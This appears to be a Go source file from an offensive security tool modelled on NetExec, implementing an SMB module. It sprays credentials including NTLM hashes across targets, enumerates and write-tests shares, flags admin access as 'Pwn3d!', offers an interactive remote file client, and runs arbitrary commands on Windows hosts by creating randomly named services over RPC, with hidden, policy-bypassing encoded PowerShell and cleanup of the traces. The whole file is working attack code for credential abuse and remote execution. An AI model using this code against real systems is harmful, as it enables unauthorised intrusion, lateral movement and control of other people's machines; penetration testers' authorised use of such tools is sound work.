package cli

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"slices"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/5amu/gonetexec/internal/logger"
	"github.com/5amu/gonetexec/internal/runner"
	altsmb "github.com/5amu/gonetexec/pkg/smb"
	"github.com/fatih/color"
	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/svcctl"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/smb"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

const DefaultPort = 445

const HelpMsg = `
shares - list available shares
use {sharename} - connect to an specific share
cd {path} - changes the current directory to {path}
ls {opt path} - lists all the files in the current directory or the specified path
tree {filepath} - recursively lists all files in folder and sub folders
rm {file} - removes the selected file
mkdir {dirname} - creates the directory under the current path
rmdir {dirname} - removes the directory under the current path
put {filename} - uploads the filename into the current path
get {filename} - downloads the filename from the current path
mget {mask} - downloads all files from the current directory matching the provided mask
cat {filename} - reads the filename from the current path
mount {target,path} - creates a mount point from {path} to {target} (admin required)
umount {path} - removes the mount point at {path} without deleting the directory (admin required)
close - closes the current SMB Session
exit - terminates the server process (and this session)
logoff - logs off

`

func NewSMBCmd() *cobra.Command {
	var username, password, ntlm, domain string
	var port int
	var listShares, client bool
	var execCmd string

	cmd := &cobra.Command{
		Use:   "smb [TARGETS...]",
		Short: "Own stuff using SMB",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			targets := runner.ExtractTargets(args)
			if len(targets) == 0 {
				return
			}

			credentials := runner.NewCredentialsDispacher(
				username,
				password,
				ntlm,
				runner.Clusterbomb,
			)
			if len(credentials) == 0 {
				return
			}

			doNothing := !slices.Contains(os.Args, "-u")

			var runners []runner.Runner
			for _, target := range targets {
				target.Port = port
				for _, creds := range credentials {
					creds.Domain = domain
					runners = append(runners, &SMBRunner{
						target:      target,
						port:        port,
						credentials: creds,
						listShares:  listShares,
						execCmd:     execCmd,
						client:      client,
						doNothing:   doNothing,
					})
				}
			}

			if err := runner.ParallelRun(context.Background(), runners, nil); err != nil {
				l := logger.New("SMB", targets[0].Host, targets[0].Host, port)
				l.Error(fmt.Sprintln(err))
			}
		},
	}

	connFlags := pflag.NewFlagSet("Connection Flags", pflag.ContinueOnError)
	connFlags.StringVarP(&username, "username", "u", "", "Provide username (or FILE)")
	connFlags.StringVarP(&password, "password", "p", "", "Provide password (or FILE)")
	connFlags.StringVarP(&ntlm, "hashes", "H", "", "authenticate with NTLM hash")
	connFlags.StringVarP(&domain, "domain", "d", "", "provide domain")
	connFlags.IntVar(&port, "port", DefaultPort, "Provide SMB port")

	actions := pflag.NewFlagSet("Actions Flags", pflag.ContinueOnError)
	actions.BoolVar(&listShares, "shares", false, "list open shares")
	actions.StringVarP(&execCmd, "exec", "x", "", "execute a command by creating a service via RPC")
	actions.BoolVar(&client, "client", false, "Open a client to the remote machine")

	return generateCli(cmd, connFlags, actions)
}

type SMBRunner struct {
	target      session.Target
	port        int
	credentials session.Credentials
	listShares  bool
	execCmd     string
	client      bool
	cancelCtx   context.CancelFunc
	doNothing   bool
}

func (r *SMBRunner) Start(ctx context.Context) error {
	childCtx, cancel := context.WithCancel(ctx)
	r.cancelCtx = cancel
	defer r.Stop()

	info, err := altsmb.Fingerprint(r.target.Host, r.target.Port)
	if err != nil {
		fmt.Println(err)
		return err
	}
	l := logger.New("SMB", r.target.Host, info.NetBIOSComputerName, r.port)
	l.Info(formatSMBFingerprint(info))

	if r.doNothing {
		return nil
	}

	r.credentials.Domain = info.DNSDomainName

	if r.listShares {
		return r.enumShares(childCtx)
	}
	if r.execCmd != "" {
		return r.exec(childCtx)
	}
	if r.client {
		return r.smbclient(childCtx)
	}
	return r.authenticate(childCtx)
}

func (r *SMBRunner) Stop() {
	if r.cancelCtx != nil {
		r.cancelCtx()
	}
}

func formatSMBFingerprint(f *altsmb.SMBFingerprint) string {
	var builder strings.Builder
	builder.WriteString(f.DNSComputerName)
	if f.OSVersion != "" {
		builder.WriteString(" " + fmt.Sprintf("(version:%s)", f.OSVersion))
	}
	builder.WriteString(" " + fmt.Sprintf("(name:%s)", f.NetBIOSComputerName))
	builder.WriteString(" " + fmt.Sprintf("(domain:%s)", f.DNSDomainName))

	var colorFmt string
	if !f.SigningRequired {
		colorFmt = color.New(color.FgRed, color.Bold).SprintfFunc()("signing:False")
	} else {
		colorFmt = color.New(color.FgGreen).SprintfFunc()("signing:True")
	}
	builder.WriteString(" (" + colorFmt + ")")
	if !f.V1Support {
		colorFmt = color.New(color.FgCyan).SprintfFunc()("SMBv1:False")
	} else {
		colorFmt = color.New(color.FgYellow).SprintfFunc()("SMBv1:True")
	}
	builder.WriteString(" (" + colorFmt + ")")
	return builder.String()
}

func (r *SMBRunner) authenticate(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)
	client, err := r.connect(ctx)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if IsAdminShareWritable(client) {
		l.Log(context.Background(), logger.LevelSuccess.Level(), credentialStringWithDomain(r.credentials)+color.YellowString(" (Pwn3d!)"))
	} else {
		l.Log(context.Background(), logger.LevelSuccess.Level(), credentialStringWithDomain(r.credentials))
	}
	return nil
}

func (r *SMBRunner) enumShares(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	client, err := r.connect(ctx)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	sh, err := client.ListShares()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	var res [][]string
	for _, sname := range sh {
		var toAppend []string
		readable := false
		writable := false

		if strings.EqualFold(sname, "IPC$") {
			readable = true
			writable = false
		} else {
			if err := client.UseShare(sname); err == nil {
				readable = true
				writable = isShareWritable(client, "goadtest.txt")
				if writable {
					_ = client.Rm("goadtest.txt")
				}
			}
		}

		toAppend = []string{sname}
		if readable {
			w := "READ"
			if writable {
				w += ",WRITE"
			}
			toAppend = append(toAppend, w)
		}
		res = append(res, toAppend)
	}

	l.Log(context.Background(), logger.LevelSuccess.Level(), "Listing shares: ")
	for _, shareInfo := range res {
		l.Info(strings.Join(shareInfo, " "))
	}
	return nil
}

func (r *SMBRunner) exec(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	client, err := r.connect(ctx)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	output, err := smbExec(ctx, client, r.execCmd, smbExecOptions{
		share:     "C$",
		shellType: "cmd",
		mode:      "SHARE",
		noOutput:  false,
		timeout:   30,
	})
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	if output != "" {
		l.Info(output)
	}
	return nil
}

func (r *SMBRunner) smbclient(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	client, err := r.connect(ctx)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	stop := false
	baseLoc := fmt.Sprintf("\\\\%s\\", r.target.Host)
	currentPath := "\\"
	share := ""
	cmdBufio := bufio.NewReader(os.Stdin)
	for !stop {
		fmt.Printf("(%s) %s >> ", r.credentials.Username, baseLoc+share+currentPath)
		cmd, err := cmdBufio.ReadString('\n')
		if err != nil {
			l.Error(fmt.Sprintln(err))
			return err
		}

		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd, "\n", ""), "\r", "")
		switch cmd {
		case "exit", "logoff", "close":
			stop = true
		case "help":
			fmt.Print(HelpMsg)
			continue
		case "shares":
			sharenames, err := client.ListShares()
			if err != nil {
				l.Error(fmt.Sprintln(err))
			} else {
				for _, s := range sharenames {
					l.Info(s)
				}
			}
			continue
		case "ls":
			cmd = "ls " + currentPath
		case "cd":
			currentPath = "\\"
			continue
		}

		splitted := strings.Split(cmd, " ")
		if len(splitted) != 2 {
			l.Info(fmt.Sprintf("Unknown command: '%s'", cmd))
			continue
		}

		switch splitted[0] {
		case "use":
			if err := client.UseShare(splitted[1]); err != nil {
				l.Error(fmt.Sprintln(err))
				continue
			}
			share = splitted[1] + "\\"
			currentPath = "\\"
		case "ls":
			files, err := client.Ls(splitted[1])
			if err != nil {
				l.Error(fmt.Sprintln(err))
				continue
			}
			for _, f := range files {
				l.Info(f.Name())
			}
		case "cd":
			if err := client.Cd(splitted[1]); err != nil {
				l.Error(fmt.Sprintln(err))
				continue
			}
			currentPath = client.GetCurrentPath()
		}
	}
	l.Info("session closed")
	return nil
}

func (r *SMBRunner) connect(ctx context.Context) (*smb.Client, error) {
	target := r.target
	if target.Port == 0 {
		target.Port = r.port
	}
	creds := r.credentials
	if creds.Domain == "" {
		creds.Domain = r.credentials.Domain
	}

	client := smb.NewClient(target, &creds)

	if err := client.Connect(); err != nil {
		return nil, err
	}
	return client, nil
}

func IsAdminShareWritable(c *smb.Client) bool {
	if err := c.UseShare("ADMIN$"); err != nil {
		return false
	}
	if !isShareWritable(c, "goadtest.txt") {
		return false
	}
	_ = c.Rm("goadtest.txt")
	return true
}

type smbExecOptions struct {
	share     string
	mode      string
	shellType string
	noOutput  bool
	timeout   int
}

func smbExec(ctx context.Context, client *smb.Client, cmd string, opts smbExecOptions) (string, error) {
	if opts.share == "" {
		opts.share = "C$"
	}
	if opts.mode == "" {
		opts.mode = "SHARE"
	}
	if opts.shellType == "" {
		opts.shellType = "cmd"
	}
	if opts.timeout <= 0 {
		opts.timeout = 30
	}

	pipe, err := client.OpenPipe("svcctl")
	if err != nil {
		return "", err
	}
	defer pipe.Close()

	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
		return "", err
	}

	sc, err := svcctl.NewServiceController(rpcClient)
	if err != nil {
		return "", err
	}
	defer sc.Close()

	if opts.mode == "SHARE" {
		if err := client.UseShare(opts.share); err != nil {
			return "", err
		}
	}

	exec := &smbExecutor{
		sc:        sc,
		client:    client,
		share:     opts.share,
		mode:      opts.mode,
		shellType: opts.shellType,
		noOutput:  opts.noOutput,
		timeout:   opts.timeout,
	}

	output, err := exec.execute(cmd)
	if err != nil {
		return "", err
	}
	return output, nil
}

type smbExecutor struct {
	sc        *svcctl.ServiceController
	client    *smb.Client
	share     string
	mode      string
	shellType string
	noOutput  bool
	timeout   int
}

const smbExecOutputFile = "__output"

func (e *smbExecutor) execute(data string) (string, error) {
	batchFile := randomString(8) + ".bat"
	outputPath := fmt.Sprintf("\\\\%%COMPUTERNAME%%\\%s\\%s", e.share, smbExecOutputFile)

	shell := "%COMSPEC% /Q /c "
	var command string
	if e.shellType == "powershell" {
		psCommand := "$ProgressPreference='SilentlyContinue';" + data
		encoded := encodeUTF16LEBase64(psCommand)
		psPrefix := "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc "
		batchContent := psPrefix + encoded + " > " + outputPath + " 2>&1"
		command = shell + "echo " + escapeForEcho(batchContent) + " > %" + "TEMP" + "%\\" + batchFile + " & " + shell + "%" + "TEMP" + "%\\" + batchFile
	} else {
		command = shell + "echo (" + escapeForEcho(data) + ") ^> " + outputPath + " 2^>^&1 > %" + "TEMP" + "%\\" + batchFile + " & " + shell + "%" + "TEMP" + "%\\" + batchFile
	}

	command += " & del %" + "TEMP" + "%\\" + batchFile

	svcName := randomString(8)
	svcHandle, err := e.sc.CreateService(svcName, svcName, command,
		svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)
	if err != nil {
		if strings.Contains(err.Error(), "0x00000431") {
			h, openErr := e.sc.OpenService(svcName, svcctl.SERVICE_ALL_ACCESS)
			if openErr == nil {
				_ = e.sc.DeleteService(h)
				_ = e.sc.CloseServiceHandle(h)
			}
			svcName = randomString(8)
			svcHandle, err = e.sc.CreateService(svcName, svcName, command,
				svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)
		}
		if err != nil {
			return "", fmt.Errorf("create service failed: %v", err)
		}
	}

	_ = e.sc.StartService(svcHandle)
	_ = e.sc.DeleteService(svcHandle)
	_ = e.sc.CloseServiceHandle(svcHandle)

	if e.noOutput {
		return "", nil
	}
	return e.getOutput()
}

func (e *smbExecutor) getOutput() (string, error) {
	if e.mode != "SHARE" {
		return "", nil
	}

	var content string
	maxIterations := e.timeout * 10
	for i := 0; i < maxIterations; i++ {
		time.Sleep(100 * time.Millisecond)
		c, err := e.client.Cat(smbExecOutputFile)
		if err == nil {
			content = c
			_ = e.client.Rm(smbExecOutputFile)
			break
		}
		if strings.Contains(err.Error(), "STATUS_SHARING_VIOLATION") {
			continue
		}
		if strings.Contains(err.Error(), "STATUS_OBJECT_NAME_NOT_FOUND") {
			continue
		}
	}
	return content, nil
}

func escapeForEcho(s string) string {
	s = strings.ReplaceAll(s, "^", "^^")
	s = strings.ReplaceAll(s, "&", "^&")
	s = strings.ReplaceAll(s, "|", "^|")
	s = strings.ReplaceAll(s, "<", "^<")
	s = strings.ReplaceAll(s, ">", "^>")
	s = strings.ReplaceAll(s, "(", "^(")
	s = strings.ReplaceAll(s, ")", "^)")
	return s
}

func encodeUTF16LEBase64(s string) string {
	utf16Chars := utf16.Encode([]rune(s))
	bytes := make([]byte, len(utf16Chars)*2)
	for i, c := range utf16Chars {
		bytes[i*2] = byte(c)
		bytes[i*2+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	_, _ = rand.Read(b)
	for i := range b {
		b[i] = chars[int(b[i])%len(chars)]
	}
	return string(b)
}

func isShareWritable(c *smb.Client, name string) bool {
	if c == nil {
		return false
	}

	localFile, err := os.CreateTemp("", "gnx-smb-*")
	if err != nil {
		return false
	}
	localPath := localFile.Name()
	_, _ = localFile.WriteString("test")
	_ = localFile.Close()
	defer os.Remove(localPath)

	if err := c.Put(localPath, name); err != nil {
		return false
	}
	return true
}

func credentialStringWithDomain(creds session.Credentials) string {
	if creds.Hash != "" {
		return fmt.Sprintf("%s\\%s:%s", creds.Domain, creds.Username, creds.Hash)
	}
	return fmt.Sprintf("%s\\%s:%s", creds.Domain, creds.Username, creds.Password)
}
